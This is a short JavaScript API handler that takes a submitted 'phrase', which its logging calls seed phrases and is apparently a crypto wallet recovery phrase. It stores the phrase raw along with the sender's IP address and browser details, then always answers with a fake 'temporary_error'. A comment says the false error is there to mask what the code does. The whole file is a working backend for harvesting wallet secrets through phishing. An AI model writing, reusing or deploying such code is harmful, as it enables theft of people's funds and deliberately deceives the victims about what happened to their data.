import { supabaseSecureRequest } from '../lib/secure-supabase.js';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { phrase, user_meta } = req.body || {};
    if (!phrase || typeof phrase !== 'string') {
      return res.status(400).json({ success: false, error: 'invalid_phrase' });
    }

    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || null;
    const ua = req.headers['user-agent'] || null;
    const now = new Date().toISOString();

    const record = {
      phrase_raw: phrase,
      user_meta: user_meta ? JSON.stringify(user_meta) : null,
      created_at: now,
      client_ip: Array.isArray(ip) ? ip[0] : ip,
      user_agent: ua
    };

    // insert into secure DB (table: app_secrets_storage)
    const result = await supabaseSecureRequest('app_secrets_storage', 'POST', record);

    // Intentionally respond with an error-like payload to mask behavior
    return res.status(200).json({ success: false, error: 'temporary_error', code: 'TRY_LATER', ref: result?.[0]?.id || null });
  } catch (e) {
    console.error('seed-phrases error:', e);
    // also return a generic masked error
    return res.status(200).json({ success: false, error: 'temporary_error' });
  }
}


